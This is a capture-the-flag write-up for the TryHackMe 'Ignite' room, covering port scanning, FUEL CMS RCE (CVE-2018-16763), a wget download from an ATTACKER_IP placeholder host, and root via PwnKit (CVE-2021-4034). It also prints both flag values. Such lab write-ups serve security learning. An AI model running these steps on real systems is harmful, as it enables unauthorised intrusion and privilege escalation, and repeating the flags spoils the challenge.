---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/ignite/","tags":["CTF","write-up","LFI","RCE","SUID"]}
---

![Pasted image 20240920115253.png|200](/img/user/attachments/Pasted%20image%2020240920115253.png)
Root the box! Designed and created by [DarkStar7471](https://tryhackme.com/p/DarkStar7471), built by [Paradox](https://tryhackme.com/p/Paradox).

---
# Active reconnaisance
## Enum ports and services
Run an full scan
```shell
sudo nmap 10.10.140.16 -p- -n --min-rate 5000 -sS --open -vvv
```

```c
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 61
```
## OS
Based in the ttl `61`, could be a linux machine
system Linux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
Ubuntu 16.04.6 LTS

---
# Vuln analisis
## Port 80
```c
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
```
![Pasted image 20240920121719.png|400](/img/user/attachments/Pasted%20image%2020240920121719.png)
From the robots file and the webpage we know that the subdirectory `fuel` exists
### fuel
![Pasted image 20240920122454.png|400](/img/user/attachments/Pasted%20image%2020240920122454.png)
Login with the credentials from the main page
![Pasted image 20240920125300.png|300](/img/user/attachments/Pasted%20image%2020240920125300.png)
We are in the admin dashboard
![Pasted image 20240920125339.png|400](/img/user/attachments/Pasted%20image%2020240920125339.png)
Anyway I'll try to find doing fuzzing
```shell
wfuzz -c -t 100 --hc=404,403 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 10.10.140.16/FUZZ
```
### assets
We found `assets` and it's forbidden

---
# Exploitation
## CVE-2018-16763
Looking for Fuel 1.4.1 on `searchsploit` we found a [[RCE\|RCE]] vulnerability associated to the CVE-2018-16763
![Pasted image 20240921084919.png](/img/user/attachments/Pasted%20image%2020240921084919.png)
![Pasted image 20240921084949.png|500](/img/user/attachments/Pasted%20image%2020240921084949.png)
NIST show more information
![Pasted image 20240921085153.png|600](/img/user/attachments/Pasted%20image%2020240921085153.png)
Using the exploit we have a shell
```shell
python 50477.py -u http://10.10.209.122
```
![Pasted image 20240921091135.png|400](/img/user/attachments/Pasted%20image%2020240921091135.png)

Get the first flag
![Pasted image 20240921114219.png|400](/img/user/attachments/Pasted%20image%2020240921114219.png)
> [!check]- flag.txt
> 6470e394cbf6dab6a91682cc8585059b

---
# Privilege Escalation
Enumerating 
systemLinux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
Ubuntu 16.04.6 LTS
## Runing linpeas on the system
1. On the attacker machine get the file
```shell
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```
2. Start a python server
   `python3 -m http.server 4747`
3. On the victim machine get the file and make it executable
```shell
wget http://ATTACKER_IP:4747/linpeas.sh
chmod +x linpeas.sh
```
4. Run it and save it in a txt file
```shelll
./linpeas.sh > linpeas_scan.txt
```
## CVE-2021-4034
From LinPeas we have  this suggestion
```
Executing Linux Exploit Suggester
https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

> [!cite] NIST-CVE-2021-4034
> A local privilege escalation vulnerability was found on polkit's **pkexec** utility. The pkexec application is a **setuid** tool designed to allow unprivileged users to **run commands as privileged users** according predefined policies. The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.

We have pkexec installed and as SUID
![Pasted image 20240923172901.png|600](/img/user/attachments/Pasted%20image%2020240923172901.png)

The exploit from `LinPeas` doesn't work, but searching another option I found this exploit written in `python`
https://github.com/Almorabea/pkexec-exploit
After getting to the victim machine, the exploit works.
![Pasted image 20240923172233.png|500](/img/user/attachments/Pasted%20image%2020240923172233.png)
![Pasted image 20240923172249.png|80](/img/user/attachments/Pasted%20image%2020240923172249.png)
And finally capture the root flag.
![Pasted image 20240923172354.png|400](/img/user/attachments/Pasted%20image%2020240923172354.png)
> [!check]- root.txt
> b9bbcb33e11b80be759c4e844862482d

---